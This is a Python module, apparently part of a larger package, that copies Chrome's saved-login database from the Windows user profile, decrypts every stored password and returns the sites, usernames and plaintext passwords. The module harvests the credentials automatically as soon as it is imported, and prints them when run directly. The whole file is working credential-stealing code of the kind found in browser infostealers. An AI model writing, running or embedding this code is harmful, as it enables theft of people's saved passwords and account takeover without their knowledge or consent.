import os
import sqlite3
import shutil
from .encrypt import get_encryption_key
from .decrypt import decrypt_password
from .chrome_datetime import get_chrome_datetime


def extract():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("""select origin_url, action_url, username_value, password_value,
     date_created, date_last_used from logins order by date_created""")

    data = []
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url, action_url, username, password, date_created, date_last_used, result = row[0], row[1], row[
            2], decrypt_password(row[3], key), row[4], row[5], {}
        if username or password:
            result["original_url"], result["action_url"], result["username"], result[
                "password"] = origin_url, action_url, username, password
        else:
            continue
        if date_created != 86400000000 and date_created:
            result["creation_date"] = str(get_chrome_datetime(date_created))
        if date_last_used != 86400000000 and date_last_used:
            result["last_used"] = str(get_chrome_datetime(date_last_used))
        data.append(result)

    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
    finally:
        return data


extract_password = extract()

if __name__ == "__main__":
    print(len(extract_password), extract_password)
